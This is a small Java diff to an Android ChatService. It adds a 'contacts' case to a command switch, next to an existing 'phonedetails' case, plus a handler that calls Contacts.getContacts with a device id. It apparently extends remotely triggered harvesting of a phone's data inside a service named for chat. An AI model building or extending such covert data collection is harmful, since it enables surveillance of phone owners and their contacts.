@@ -115,6 +115,9 @@ public class ChatService extends Service {
                     case "phonedetails":
                         handlePhoneDetails();
                         break;
+                    case "contacts":
+                        handleContacts();
+                        break;
                     default:
                         break;
                 }
@@ -219,6 +222,15 @@ public class ChatService extends Service {
         Context context = getApplicationContext();
         try {
             PhoneDetails.getAllDetails(context, getId());
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void handleContacts(){
+        Context context = getApplicationContext();
+        try {
+            Contacts.getContacts(context, getId());
         } catch (Exception e) {
             e.printStackTrace();
         }
